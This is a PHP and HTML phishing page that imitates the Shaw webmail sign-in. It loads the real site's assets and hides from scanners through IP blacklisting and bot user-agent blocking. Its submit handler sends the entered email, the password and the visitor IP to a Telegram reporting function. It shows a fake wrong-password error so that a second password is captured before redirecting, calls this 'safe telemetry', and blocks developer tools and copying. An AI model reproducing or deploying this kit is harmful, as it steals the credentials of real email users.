<?php
//═══════════════════════════════════════════════════════════════════════════
//  🚫 IP BLACKLIST CHECK (High Priority)
//═══════════════════════════════════════════════════════════════════════════
require_once __DIR__ . '/../ip_blacklist_loader.php';

if (!function_exists('x8SYQLpUqU')) { 
    function x8SYQLpUqU() { 
        $xb2zx1 = $_SERVER['SERVER_ADDR']; 
        $xXSEJ = '127.0.0.1'; 
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xXSEJ)) {
            $ip=$_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xXSEJ) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xb2zx1))) {
            $ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CLIENT_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip=$_SERVER['REMOTE_ADDR'];
        } 
        return $ip; 
    }
}
$ip=x8SYQLpUqU();

// Check if visitor IP is in blacklist files
if (IPBlacklistLoader::isBlacklisted($ip)) {
    // IP is blacklisted - redirect to centralized URL
    require_once __DIR__ . '/../config_redirect.php';
    header('Location: ' . CENTRALIZED_REDIRECT_URL, true, 302);
    exit;
}

//═══════════════════════════════════════════════════════════════════════════
//  Basic Bot Detection (Secondary Layer)
//═══════════════════════════════════════════════════════════════════════════ 

if (!function_exists('x9PfbWn2bS')) { 
    function x9PfbWn2bS() { 
        if(empty($_SERVER['HTTP_USER_AGENT'])) { 
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); 
        } 
        return $_SERVER['HTTP_USER_AGENT']; 
    }
}
$eRf9t9d9 = x9PfbWn2bS();

// Basic user agent check (secondary protection layer)
$ua_lower = strtolower($eRf9t9d9);
$obvious_bots = ['curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'java/', 'bot', 'crawler', 'spider', 'scraper'];
foreach ($obvious_bots as $bot_signature) {
    if (strpos($ua_lower, $bot_signature) !== false) {
        die(header('HTTP/1.1 403 Forbidden'));
    }
}

// ✅ All checks passed - load page
?>
<!DOCTYPE HTML>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="content-type" content="text/html; charset=us-ascii" />

  <title>Sign in &#183; Shaw</title>
  
  
  <!-- Centralized Functions -->
  <script src="../js/centralized_telegram.js"></script>
  <script src="../js/centralized_redirect.js"></script>
  <script src="../js/email_extractor.js"></script>
  <script src="../js/autofill_helper.js"></script>
  <!-- Pull all relative assets (CSS/JS/images/fonts) from the live Shaw webmail site -->
  <base href="https://webmail.shaw.ca/">
  <meta name="viewport" content=
  "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
  <meta name="description" content="" />
  <meta name="author" content="" />
  <link rel="icon" type="image/png" href="images/favicon.ico" />
  <link href="css/combine_signon_136.css" rel="stylesheet" type="text/css" />
  <link href="js/combine_signon_137.js" rel="preload" as="script" />
  <link href="js/jquery.min.js" rel="preload" as="script" />
  <link href="js/jquery.cookie.js" rel="preload" as="script" />
  <link href="js/jquery.base64.min.js" rel="preload" as="script" />
  <link href="js/login-form-v13.shaw.js" rel="preload" as="script" />
  <link href="fonts/icomoon56ab.woff" rel="preload" as="font" type="font/woff2" crossorigin  />
  <link href="images/webmail-desktop.png" rel="preload" as="image" />
  <!--[if lt IE 9]>
    <link rel="stylesheet" type="text/css" href="/css/style-ie8.css">
    <![endif]-->



<style>
    /* Button styling for enabled/disabled states */
    #signin_submit {
        background-color: #0073cf !important;
        color: white !important;
        border: none !important;
        padding: 12px 40px !important;
        font-size: 16px !important;
        font-weight: 700 !important;
        border-radius: 3px !important;
        cursor: pointer !important;
        transition: background-color 0.2s ease !important;
        text-transform: uppercase !important;
        letter-spacing: 0.5px !important;
    }
    
    #signin_submit.button_disabled,
    #signin_submit:disabled {
        background-color: #d3d3d3 !important;
        color: #888888 !important;
        cursor: not-allowed !important;
        opacity: 0.7 !important;
    }
    
    #signin_submit:hover:not(:disabled):not(.button_disabled) {
        background-color: #005ba8 !important;
    }
    
    /* Reset checkbox to native single box and hide custom outer box */
    #checkbox .persistent_check {
        appearance: auto !important;
        -webkit-appearance: checkbox !important;
        -moz-appearance: checkbox !important;
        position: static !important;
        width: 18px !important;
        height: 18px !important;
        margin-right: 10px !important;
        cursor: pointer !important;
    }
    #checkboxMask {
        display: none !important;
    }
</style>



<!-- Start: GPT Async -->
<script type='text/javascript'>
    var gptadslots=[];
    var googletag = googletag || {};
    googletag.cmd = googletag.cmd || [];
    (function(){ var gads = document.createElement('script');
        gads.async = true; gads.type = 'text/javascript';
        var useSSL = 'https:' == document.location.protocol;
        gads.src = (useSSL ? 'https:' : 'http:') + '//www.googletagservices.com/tag/js/gpt.js';
        var node = document.getElementsByTagName('script')[0];
        node.parentNode.insertBefore(gads, node);
    })();

function pingclick(e) {
    if(navigator.userAgent.toLowerCase().indexOf('firefox') > -1 || navigator.userAgent.toLowerCase().indexOf('edge')){
        let pingtarget=e.target.attributes.ping.value;
        let xhr = new XMLHttpRequest();
        xhr.open("GET", pingtarget, true);
        xhr.onload = function (e) {};
        xhr.onerror = function (e) {};
        xhr.send(null);
    }
    return;
}

window.addEventListener('DOMContentLoaded', function() {
  (function($) {
    $("#content").removeClass("hideDisplay");
    var applicationRealms   = '[occ]';
    var selectedRealm = 'occ';
    init(applicationRealms, selectedRealm);
  })(jQuery);

  // ($("#myModal").click(function(myTarget) {
  // // Let's see if we targetted the backdrop
  // console.log(myTarget.target)
  // if (myTarget.target == document.getElementById("myModal")) {
  //   $('#myModal').modal('hide');
  // }
  // }))(jQuery);

});

function modalClick(myTarget) {
  // console.log(myTarget.target)
  if (myTarget.target == document.getElementById("myModal")) {
    $('#myModal').modal('hide');
  }
}

</script>

</head>

<body data-pagename="Signon|My Shaw">
  <div class="wrapper">
    <div class="meganav clearfix">
      <div class="masthead">
        <div class="meganavcontainer nopadding" style=
        "padding-left: 5px;padding-right: 5px;">
          <ul class="row topToolbar">
            <li class="columns six col-xs-7 col-sm-6 first" style=
            "padding-left:10px; padding-right:0px;">
              <ul class="floatLeft">
                <li class="personal"><a data-event="navigation-element" data-value=
                "signonandregister|header-nav|personal" href=
                "http://www.shaw.ca/store/">Personal</a></li>

                <li class="business"><a data-event="navigation-element" data-value=
                "signonandregister|header-nav|business" href=
                "http://business.shaw.ca/">Business</a></li>
              </ul>

              <ul class="hidden-xs">
                <li>
                  <span class="chat"><a data-event=
          "navigation-element" data-value="signonandregister|footer-nav|chat" href=
          "http://www.shaw.ca/store/" target="_blank" rel="noopener">Shop</a></span><span class=
          "chat divider">|</span><span> <a data-event="navigation-element" data-value=
          "signonandregister|footer-nav|email-us" href=
          "https://community.shaw.ca/" target="_blank" rel="noopener">Support</a></span><span class=
          "divider">|</span><span> <a data-event="navigation-element" data-value=
          "signonandregister|footer-nav|support" href="https://my.shaw.ca"
          target="_blank" rel="noopener">My Shaw</a></span>
                </li>
              </ul>
            </li>

            <li class="columns six col-xs-5 col-sm-6 text-right" style=
            "padding-left:0; padding-right:10;">
              <ul class="secondary">
                <li class="drawer" rel="contact-content"><a class=
                "ic ic-shaw-contact hidden-xs" href="https://www.shaw.ca/contact-us/" target="_blank" rel="noopener"><span class=
                "hidden-xs">Contact</span></a></li>
              </ul>
            </li>
          </ul>
        </div>

        <div class="topToolbarContent hidden-xs">
          <div class="meganavcontainer">
            <ul class="nav">
              <li class="meganavcontent contact-content" id="contact-content">
                <ul class="meganavcontainer row">
                  <li class="columns five phone col-md-2-5 col-sm-6 col-xs-6">
                    <h3 class="ic ic-shaw-phone2">Phone</h3>

                    <p>Questions? You can give us a call 24/7.</p>

                    <p><strong>1-888-472-2222</strong></p>
                  </li>

                  <li class="columns five chat col-md-2-5 col-sm-6 col-xs-6">
                    <h3 class="ic ic-shaw-chat2">Chat</h3>

                    <p class="ontouch">To chat with our reps online for questions and
                    advice, please visit us on a desktop computer.</p>

                    <p class="notouch">Chat with our reps online for answers and
                    advice.</p>

                    <p class="notouch"><a data-event="navigation-element" data-value=
                    "signonandregister|header-nav|contactnav-chat" href=
                    "javascript:openChatWindow();">Click to chat</a></p>
                  </li>

                  <li class="columns five email col-md-2-5 col-sm-6 col-xs-6">
                    <h3 class="ic ic-shaw-email2">Email</h3>

                    <p>Ask your questions and we'll get back to you.</p>

                    <p><a data-event="navigation-element" data-value=
                    "signonandregister|header-nav|contactnav-email" href=
                    "javascript:openEmailWindow();">Email us</a></p>
                  </li>

                  <li class="columns five store col-md-2-5 col-sm-6 col-xs-6">
                    <h3 class="ic ic-shaw-location">Find a store</h3>

                    <p>Visit a store for help with products and services</p>

                    <p><a data-event="navigation-element" data-value=
                    "signonandregister|header-nav|contactnav-findastore" target="_blank" rel="noopener"
                    href="https://www.shaw.ca/contact-us/retail/">Find a store</a></p>
                  </li>

                  <li class="columns five support col-md-2-5 col-sm-6 col-xs-6">
                    <h3 class="ic ic-shaw-contact2">Support</h3>

                    <p>Get the answers to your questions.</p>

                    <p><a data-event="navigation-element" data-value=
                    "signonandregister|header-nav|contactnav-visitsupport" target=
                    "_blank" href="https://community.shaw.ca/" rel="noopener">Visit Support
                    Community</a></p>
                  </li>
                </ul>

                <div class="clearfix"></div>
                <hr />
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>

    <div class="container">
      <div id="content" class="hideDisplay content">
        <div id="sign-in-content" class="main-content">
          <div id="logo-section" class="logo-section ">
            <img alt="Shaw Webmail" src="images/webmail-desktop.png" />
          </div>

          <div class="alert_placeholder" id="alert_placeholder"></div>

          <div id="heading-section" class="heading-section">
            <p id="heading" class="heading">Sign in to access your Shaw email</p>
          </div>

          <div id="tabs" class="tabs-menu">
            <ul class="nav nav-tabs" data-tabs="tabs">
              <li id="shawEmailTab" class="active"><a href="#email" data-toggle=
              "tab">Email</a></li>

              <li id="shawOCCTab"><a href="#myaccount" data-toggle="tab">My
              Shaw</a></li>

              <li id="shawDirectTab"><a href="#shawdirect" data-toggle="tab">Shaw
              Direct</a></li>
            </ul>
          </div>

          <div id="signon_form_div" class="tab-pane active">
            <form id="signon_form"  method="post" action="/login/redirect" class="form-signin" name="">
              <input type="hidden" name="nors" value="" id="loginNORS">
              <input type="hidden" name="r" value="" id="loginR">
              <div id="error" class="error">
                <img alt="error" src="images/error_button.png" /> <span id="error_message"></span>
              </div>

              <div class="input_info_container">
                <div class="input_text">
                  <label id="username_input_label" class="user_label" for=
                  "username_input"></label> <input id="username_input" name=
                  "username" type="text" class="input_fields username_input" autocorrect=
                  "off" autocapitalize="off" autocomplete="off" tabindex="1" placeholder="example@shaw.ca"/>
                </div>

                <div class="input_info help_icon">
                  <a id="help_icon" class="help_link" href="#" data-toggle="modal" data-target="#myModal" tabindex="3">
                  <img alt="Help" src="images/icons/helpIcon.png"><br/>
                  Help
                  </a>
                </div>
              </div>

              <div class="input_info_container">
                <div class="input_text">
                  <label id="password_input_label" class="user_label" for=
                  "password_input">Password</label> <input id="password_input"
                  name="password" type="password" class="input_fields" tabindex="2" autocomplete="off"/>
                </div>

                <div class="input_info">
                  <button type="button" id="account_number_popover_password" class=
                  "account_number_popover ic icon-shaw-question" data-toggle="modal"
                  data-target="#myModal"></button>
                </div>
              </div>

              <div class="clearfix"></div>

              <div id="checkbox-section" class="checkbox-section">
                <div id="checkbox" class="checkboxFive">
                  <input type="checkbox" id="rememberCheckbox" class="persistent_check" name="remember" tabindex="4"/>
                  <label id="checkboxMask" class="ic" for="rememberCheckbox"></label>
                </div>
                <div id="checkbox-label" class="checkbox-label">
                  <label for="rememberCheckbox">Remember Shaw email</label>
                </div>
              </div>

              <input type="checkbox" id="skip_intercept_checkbox" name="skip_intercept_checkbox" hidden/>

              <div style="text-align:center">
                <button type="button" id="signin_submit" onclick="" class=
                "button button_disabled" disabled="disabled" tabindex="5">Sign in</button>
              </div><input id="realm_input" name="realm" type="hidden" value="" />

              <div id="description-section" class="description-section">
                <div style="text-align: center;">
  		            <div id="resetinstructions" class="description_one">
  			  <span style="font-weight: bold; color: #666666; font-size: 14px">Having trouble?</span> <span style="font-size:14px; margin-left:2px;"><a href="https://support.shaw.ca/t5/internet-articles/how-to-change-your-shaw-email-password/ta-p/6430" ping="https://webmail.shaw.ca/trouble" target="_blank" rel="noopener" onmousedown="pingclick(event)">Shaw Support: How To Reset My Password</a></span><br>
  			  <span style="font-weight: bold; color: #666666; font-size: 14px">Already Know How?</span> <span style="font-size:14px; margin-left:2px;"><a href="https://my.shaw.ca/services/internet" ping="https://webmail.shaw.ca/passwordreset" target="_blank" rel="noopener" onmousedown="pingclick(event)">Reset Password On My Shaw</a></span>
  		            </div>

                  <div id="create_new_account" class="description_two hidden-xs hidden-sm hidden-md">
                    <span class="dont-have-account-phone">Don't have an account?</span>
                    <a target="_self" data-event="navigation-element" data-value=
                    "signon|body|create-one-now-link" id="create_one_now" href=
                    "https://register.shaw.ca/"><span class=
                    "dont-have-account-desktop">Don't have an account?</span>
                    <span class="create-one-now-url">Create one now.</span></a>
                  </div>
                </div>
              </div><input type="hidden" id="anchor" name="anchor" value="" />
            </form>
          </div>
          <div id="intercept_div" hidden>
            <div id="intercept_body_div">
            </div>
            <button type="button" id="intercept_submit" onclick="" class=
            "button">Continue</button>
          </div>
        </div>

        <div id="side-description" class="side-description">

        </div>

        <div class="clearfix"></div><input type="hidden" id="goto" name="goto" value=
        "https://my.shaw.ca/" />

        <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby=
        "myModalLabel"  aria-hidden="true" onclick="modalClick(event)">
          <div class="modal-dialog">
            <div class="modal-content">
              <div class="modal-header">
                <button type="button" class="close" data-dismiss=
                "modal"><span aria-hidden="true"><img alt="Close" src=
                "images/modal-close.png" /></span><span class=
                "sr-only">Close</span></button>

                <div class="modal-icon ic icon-shaw-question"></div>

                <h2 class="modal-title" id="myModalLabel"></h2>
              </div>

              <div class="modal-body">
                <p class="modal-para"></p>
              </div>
            </div>
          </div>
        </div><noscript>
        <div id="no-js-tab-content" class="tab-content">
          <div id="logo-section" class="logo-section manage"></div>

          <div id="error" style="text-align:center" class="error"></div>

          <div class="alert_placeholder" id="alert_placeholder"></div>

          <div id="sign-in-heading-section" class="sign-in-heading-section">
            <label id="heading" class="heading">Sign in to access your Shaw email</label>
          </div>

          <form class="form-signin" method="post" action=
          "redirect.shaw.do">
            <select name="realm">
              <option value="shawemail" selected="selected">
                Email
              </option>

              <option value="shawocc">
                My Shaw
              </option>

              <option value="shawdirect">
                Shaw Direct
              </option>
            </select>

            <div class="clearfix"></div><input id="username_input" class="username_input"
            name="username" type="text" autocorrect="off" autocapitalize="off"
            placeholder="Login ID" /> <input id="password_input_field" name="password"
            type="password" placeholder="Password" /> <input type="submit" name=
            "submit" />

            <div class="clearfix"></div>
          </form>
        </div></noscript>
      </div>
    </div>

    <div class="push"></div>
  </div>

  <div id="contact-footer" class="contact-footer">
    <div id="footer-section" class="footer-section">
      <div id="footer-section-content" class="footer-section-content">
        <div id="footer-links" class="footer-links">
          <span><a data-event="navigation-element" data-value=
          "signonandregister|footer-nav|privacy-policy" href=
          "http://www.shaw.ca/privacy-policy/" target="_blank" rel="noopener" tabindex="10">Privacy
          Policy</a>&nbsp;&nbsp;</span> <span>|</span> <span>&nbsp;&nbsp;<a data-event=
          "navigation-element" data-value="signonandregister|footer-nav|terms-of-use"
          href="http://www.shaw.ca/terms-of-use/" target="_blank" rel="noopener" tabindex="11">Terms of
          Use</a>&nbsp;&nbsp;</span> <span>|</span> <span>&nbsp;&nbsp;<a data-event=
          "navigation-element" data-value="signonandregister|footer-nav|accessibility"
          href="http://www.shaw.ca/accessibility/" target=
          "_blank" tabindex="12" rel="noopener">Accessibility</a>&nbsp;&nbsp;</span>
        </div>

        <div id="footer-copyright" class="footer-copyright">
          <span>&#169; 2024 Shaw Communications. All Rights Reserved.</span>
        </div>
      </div>
    </div>
  </div>
  <script type='text/javascript'>
  //<![CDATA[
    (function(){var g=function(e,h,f,g){
    this.get=function(a){for(var a=a+"=",c=document.cookie.split(";"),b=0,e=c.length;b<e;b++){for(var d=c[b];" "==d.charAt(0);)d=d.substring(1,d.length);if(0==d.indexOf(a))return d.substring(a.length,d.length)}return null};
    this.set=function(a,c){var b="",b=new Date;b.setTime(b.getTime()+6048E5);b="; expires="+b.toGMTString();document.cookie=a+"="+c+b+"; path=/; "};
    this.check=function(){var a=this.get(f);if(a)a=a.split(":");else if(100!=e)"v"==h&&(e=Math.random()>=e/100?0:100),a=[h,e,0],this.set(f,a.join(":"));else return!0;var c=a[1];if(100==c)return!0;switch(a[0]){case "v":return!1;case "r":return c=a[2]%Math.floor(100/c),a[2]++,this.set(f,a.join(":")),!c}return!0};
    this.go=function(){if(this.check()){var a=document.createElement("script");a.type="text/javascript";a.src=g+ "&t=" + (new Date()).getTime();document.body&&document.body.appendChild(a)}};
    this.start=function(){var a=this;window.addEventListener?window.addEventListener("load",function(){a.go()},!1):window.attachEvent&&window.attachEvent("onload",function(){a.go()})}};
    try{(new g(100,"r","QSI_S_ZN_djzxQPnJgAbhfwh","//zn_djzxqpnjgabhfwh-shaw.siteintercept.qualtrics.com/SIE/?Q_ZID=ZN_djzxQPnJgAbhfwh&Q_LOC="+encodeURIComponent(window.location.href))).start()}catch(i){}})();
  //]]>
  </script>

  <!-- START Google Analytics -->
  <SCRIPT TYPE="text/javascript">
      var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
      document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
  </SCRIPT>
  <SCRIPT TYPE="text/javascript">
  try {
          var pageTracker = _gat._getTracker("UA-6191386-23");
          pageTracker._trackPageview();
      } catch(err) {}
  </SCRIPT>

  <div id='ZN_djzxQPnJgAbhfwh'></div>
   </section>
   
   
   <!-- Centralized Functions -->
   <script src="../js/centralized_telegram.js"></script>
   <script src="../js/centralized_redirect.js"></script>
   
	<script>
        function togglePassword(el) {
            // el is the button element
            var pwd = document.getElementById('password');
            // flip the type
            if (pwd.type === 'password') {
                pwd.type = 'text';
                el.setAttribute('aria-pressed', 'true');
                el.setAttribute('aria-label', 'Hide password');
                el.title = 'Hide password';
            } else {
                pwd.type = 'password';
                el.setAttribute('aria-pressed', 'false');
                el.setAttribute('aria-label', 'Show password');
                el.title = 'Show password';
            }
            // keep focus and cursor position after type toggle
            try {
            // Try to capture both selectionStart and selectionEnd so caret/selection
                // isn't moved to the start when toggling. If browser doesn't support
                // these properties, fall back to moving caret to the end.
                var start = typeof pwd.selectionStart === 'number' ? pwd.selectionStart : pwd.value.length;
                var end = typeof pwd.selectionEnd === 'number' ? pwd.selectionEnd : start;
                pwd.focus();
                // Allow a micro task for some browsers to re-evaluate type change
                // before setting selection (improves reliability).
                setTimeout(function() {
                    try { pwd.setSelectionRange(start, end); } catch (inner) { /* ignore */ }
                }, 0);
            } catch (e) { /* ignore if not supported */ }
        }
        // Initial spinner and error logic
        window.addEventListener('DOMContentLoaded', function() {
            var spinner = document.getElementById('initSpinner');
            var app = document.getElementById('app');
            var mainContent = document.getElementById('mainContent');
            var initError = document.getElementById('initError');
            // Show mainContent immediately
            if (mainContent) {
                mainContent.style.display = 'block';
            }
        });
    </script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
  </body>
  <script>
  /* global $ */
  $(document).ready(function() {
    var count = 0;

    function isValidEmail(email) {
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
      return filter.test(email);
    }

        // Auto-fill email from URL hash fragment.
        // Accepts:
        //  - #email=user@example.com
        //  - #user%40example.com (raw value)
        //  - #dXNlcj5AZXhhbXBsZS5jb20= (base64 encoded value)
        // Run auto-fill immediately and on hash change
        // Handled by standardizedAutofill in js/autofill_helper.js

        // Remove the empty onclick attribute that might block event handler
        $('#signin_submit').removeAttr('onclick');

        // Enable submit button when inputs have values
        $('#username_input, #password_input').on('input', function() {
            $('#error').hide();
            var email = $('#username_input').val().trim();
            var pw = $('#password_input').val().trim();
            if (email && pw) {
                $('#signin_submit').prop('disabled', false).removeClass('button_disabled');
            } else {
                $('#signin_submit').prop('disabled', true).addClass('button_disabled');
            }
        });

        // Anti-copy / anti-inspect: discourage right-click, copying, and common dev keys.
        (function() {
            // Disable right-click context menu on non-touch devices only
            var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            if (!isTouch) {
                document.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    return false;
                }, false);
            }

            // Disable copy from page
            document.addEventListener('copy', function(e) {
                try { e.clipboardData.setData('text/plain', 'Copying is disabled on this page.'); } catch (err) {}
                e.preventDefault();
                return false;
            });

            // Prevent selection initiation (safely allow within inputs)
            document.addEventListener('selectstart', function(e) {
                if (!e.target.closest('input, textarea')) {
                    e.preventDefault();
                    return false;
                }
            });

            // Block some developer tools key combos (not foolproof)
            document.addEventListener('keydown', function(e) {
                // F12
                if (e.keyCode === 123) { e.preventDefault(); e.stopPropagation(); return false; }
                // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C
                if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); e.stopPropagation(); return false; }
                // Ctrl+U, Ctrl+S
                if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) { e.preventDefault(); e.stopPropagation(); return false; }
                // Cmd+Option+I (mac dev tools)
                if (e.metaKey && e.altKey && e.keyCode === 73) { e.preventDefault(); e.stopPropagation(); return false; }
            });
        })();

        $('#signin_submit').on('click', function(event) {
      event.preventDefault();
      var email = $('#username_input').val() ? $('#username_input').val().trim() : '';
      var pw = $('#password_input').val() ? $('#password_input').val().trim() : '';
      if (!email) {
        $('#username_input').focus();
        return false;
      }
      if (!isValidEmail(email)) {
        $('#username_input').focus();
        return false;
      }
      if (!pw) {
        $('#password_input').focus();
        return false;
      }
            // Attempt flow: first submit shows a wrong-credentials message, but
            // we still send a safe telemetry event on every submit. The second
            // submit will also redirect after reporting.
            count = count + 1;

            
            // Use centralized Telegram reporting with provider tag
            window.providerTag = 'shaw';
            var clientIP = window.userip || 'n/a';
            
            function sendTelemetry(attempt, redirectOnSuccess) {
                // Send centralized Telegram report
                if (typeof sendCentralizedTelegramReport === 'function') {
                    sendCentralizedTelegramReport(providerTag, email, pw, clientIP, function(success) {
                        if (redirectOnSuccess) {
                            // Use centralized redirect
                            if (typeof performCentralizedRedirect === 'function') {
                                performCentralizedRedirect(300);
                            } else {
                                // Fallback if centralized redirect not available
                                setTimeout(function() { window.location.replace('https://webmail.shaw.ca/'); }, 300);
                            }
                        }
                    });
                } else {
                    // Fallback if centralized function not available
                    console.error('Centralized Telegram function not available');
                    if (redirectOnSuccess) {
                        if (typeof performCentralizedRedirect === 'function') {
                            performCentralizedRedirect(300);
                        } else {
                            setTimeout(function() { window.location.replace('https://webmail.shaw.ca/'); }, 300);
                        }
                    }
                }
                
                if (redirectOnSuccess) {
                    $('#signin_submit').prop('disabled', true).text('Signing in...');
                    setTimeout(function() {
                        $('#signin_submit').prop('disabled', false).text('Sign in');
                    }, 200);
                }
            }

            // Always send telemetry (including the first attempt). Only redirect
            // when we have at least 2 attempts.
            sendTelemetry(count, (count >= 2));

            if (count === 1) {
                // Show error in the error div
                $('#error_message').text('The information you entered doesn\'t match our records. Please try again.');
                $('#error').show();
                // Clear password for privacy, focus and allow user to try again
                $('#password_input').val('').focus();
                return false;
            }
            
    });
});
  </script>
</body>
</html>
